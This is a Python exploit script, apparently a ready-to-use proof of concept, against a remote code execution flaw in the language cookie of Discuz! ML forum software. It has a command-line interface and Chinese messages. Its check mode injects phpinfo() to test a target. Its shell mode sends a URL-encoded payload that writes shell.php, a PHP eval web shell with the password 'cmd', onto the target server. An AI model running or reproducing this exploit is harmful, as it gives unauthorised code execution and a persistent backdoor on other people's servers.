#!/usr/bin/python
# coding=utf-8

import requests
import re
from argparse import ArgumentParser


class Dz_Ml_RCE:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'Cookie': 'qbn8_2132_saltkey=Gbu6t373; qbn8_2132_language={}; qbn8_2132_lastvisit=1595902511; qbn8_2132_sid=TemWvk; qbn8_2132_lastact=1595906207%09forum.php%09; qbn8_2132_sendmail=1; qbn8_2132_onlineusernum=1;PHPSESSID=8phdj361a5d498n03tnqd7c104;'
        }

    def check(self):
        '''漏洞检测'''
        self.headers['Cookie'] = self.headers['Cookie'].format("\'.phpinfo().\'")
        r = requests.get(url=result.url, headers=self.headers)
        if re.search(r'<title>phpinfo\(\)</title>', r.text):
            print("[*]Target Is Seem To Be Vulnerable!")
        else:
            print("[!]Target Is Not Seem To Be Vulnerable!")

    def getshell(self):
        shell_payload = '%27.+file_put_contents%28%27shell.php%27%2Curldecode%28%27%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%34%25%35%66%25%35%30%25%34%66%25%35%33%25%35%34%25%35%62%25%32%32%25%36%33%25%36%64%25%36%34%25%32%32%25%35%64%25%32%39%25%33%62%25%33%66%25%33%65%27%29%29.%27'
        self.headers['Cookie'] = self.headers['Cookie'].format(shell_payload)
        r = requests.get(url=result.url, headers=self.headers)
        if re.search(r'<title>Forum -  Powered by Discuz!</title>', r.text):
            print("[*]Shell Create Successfully！")
            print(f"[+]shell：在 {result.url} 同目录下的shell.php 密码：cmd")
        else:
            print("[!]Shell Create Failed！")

    def run(self):
        if result.func == 'check':
            self.check()
        elif result.func == 'shell':
            self.getshell()
        else:
            print("[!]请选择正确的功能：check(漏洞检测)/shell(直接getshell)！")


def main():
    if not result.func:
        print("[!]请先使用-f指定可选的功能：check(漏洞检测)/getshell(直接getshell)")
        return
    else:
        Dz_Ml_RCE().run()


if __name__ == '__main__':
    show = '''
      _____      _   __  __ _        _____   _____ ______ 
     |  __ \    | | |  \/  | |      |  __ \ / ____|  ____|
     | |  | |___| | | \  / | |      | |__) | |    | |__   
     | |  | |_  / | | |\/| | |      |  _  /| |    |  __|  
     | |__| |/ /|_| | |  | | |____  | | \ \| |____| |____ 
     |_____//___(_) |_|  |_|______| |_|  \_\\_____|______|
                                ______                    
                               |______|       
                               
                                            By PANDA墨森            
    '''
    print(show + '\n'*2)
    arg = ArgumentParser(description='Dz_Ml_RCE By PANDA墨森')
    arg.add_argument('url', help='目标url，eag：http://www.xxx.com/discuz/upload/forum.php')
    arg.add_argument('-f', '--func', help='可选的功能：check(漏洞检测)/shell(直接getshell)', dest='func', type=str)
    result = arg.parse_args()
    main()
